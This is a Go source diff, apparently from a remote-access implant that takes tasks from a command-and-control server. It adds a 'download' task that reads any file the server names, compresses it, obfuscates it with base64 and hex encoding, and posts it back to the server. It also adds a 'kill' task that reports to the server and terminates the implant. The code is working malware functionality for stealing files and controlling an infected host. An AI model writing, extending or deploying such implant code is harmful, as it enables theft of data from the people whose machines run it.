@@ -1,10 +1,13 @@
 package main
 
 import (
+	"bytes"
+	"compress/gzip"
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"strconv"
@@ -26,6 +29,29 @@ func encodeToBaseHexString(input string) string {
 	encodedBase64 := base64.StdEncoding.EncodeToString([]byte(input))
 	encodedHex := hex.EncodeToString([]byte(encodedBase64))
 	return encodedHex
+}
+
+func encodeBytesToBaseHexString(input []byte) string {
+	encodedBase64 := base64.StdEncoding.EncodeToString(input)
+	encodedHex := hex.EncodeToString([]byte(encodedBase64))
+	return encodedHex
+}
+
+func FileTransferShipper(serverUrl string, taskData map[string]interface{}, results []byte) {
+	encodedOutput := encodeBytesToBaseHexString(results)
+	encodedArgs := encodeToBaseHexString(taskData["args"].(string))
+
+	result := ResultsCreate{
+		TaskingID: taskData["id"].(float64),
+		Session:   taskData["session"].(string),
+		Task:      taskData["task"].(string),
+		Args:      encodedArgs,
+		Results:   encodedOutput,
+	}
+	_, err := PostJson(serverUrl, result)
+	if err != nil {
+		fmt.Println("Error posting task result:", err)
+	}
 }
 
 func DataShipper(serverUrl string, taskData map[string]interface{}, results string) {
@@ -59,7 +85,32 @@ func ReconfigHandler(serverUrl string, taskData map[string]interface{}) {
 	callbackTimer.Callback_freq, _ = strconv.Atoi(splitArgs[0])
 	callbackTimer.Jitter, _ = strconv.Atoi(splitArgs[1])
 	callbackTimer.SelfTerminate, _ = strconv.Atoi(splitArgs[2])
-        DataShipper(serverUrl, taskData, "true")
+	DataShipper(serverUrl, taskData, "true")
+}
+
+func DownloadHandler(serverUrl string, taskData map[string]interface{}) {
+	inFile, err := os.Open(taskData["args"].(string))
+	if err != nil {
+		DataShipper(serverUrl, taskData, err.Error())
+		return
+	}
+	defer inFile.Close()
+	var buf bytes.Buffer
+
+	gzipWriter := gzip.NewWriter(&buf)
+	defer gzipWriter.Close()
+
+	gzipWriter.Name = taskData["args"].(string)
+	if _, err := io.Copy(gzipWriter, inFile); err != nil {
+		DataShipper(serverUrl, taskData, err.Error())
+		return
+	}
+	if err := gzipWriter.Close(); err != nil {
+		DataShipper(serverUrl, taskData, err.Error())
+		return
+	}
+	FileTransferShipper(serverUrl, taskData, buf.Bytes())
+
 }
 
 func ParseTasks(serverUrl string, tasking string) (string, error) {
@@ -85,7 +136,13 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 		} else if taskData["task"] == "exec_fg" {
 			ExecFgHandler(url, taskData)
 		} else if taskData["task"] == "reconfig" {
-			ReconfigHandler(serverUrl, taskData)
+			ReconfigHandler(url, taskData)
+		} else if taskData["task"] == "kill" {
+			sendDeathMessage(serverUrl, taskData["session"].(string))
+			DataShipper(url, taskData, "true")
+			TerminateImplant()
+		} else if taskData["task"] == "download" {
+			DownloadHandler(url, taskData)
 		}
 
 	}
